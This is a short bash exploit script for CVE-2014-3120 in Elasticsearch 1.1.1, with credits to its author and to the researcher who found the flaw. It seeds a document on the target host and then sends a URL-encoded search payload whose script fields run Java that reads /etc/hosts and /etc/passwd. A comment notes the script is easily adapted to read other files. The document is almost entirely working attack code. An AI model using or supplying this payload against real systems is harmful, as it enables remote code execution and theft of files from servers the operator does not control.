#!/bin/bash
#Exploit Elastic Search 1.1.1  CVE-2014-3120 
#Larry W. Cashdollar @_larry0
#http://www.vapid.dhs.org/exploits/elasticexploit.sh.txt
#http://bouk.co/blog/elasticsearch-rce/
#Vulnerability author Bouke van der Bijl

echo "[+} Adding initial entry to $1:9200"
curl -XPOST "http://$1:9200/data/test/1" -d '{"exploit":"larry0"}'
echo "[+] Executing exploit against $1"
echo ""
echo "[+] Attempting to read /etc/hosts and /etc/passwd"

#This could be easily changed to request other neat files, like stuff out of /proc.

curl "http://$1:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22%2Fetc%2Fhosts%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fhosts%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%2C%22%2Fetc%2Fpasswd%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fpasswd%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%7D%7D&callback=jQuery111107445037360303104_1406750975253&_=1406750975254"

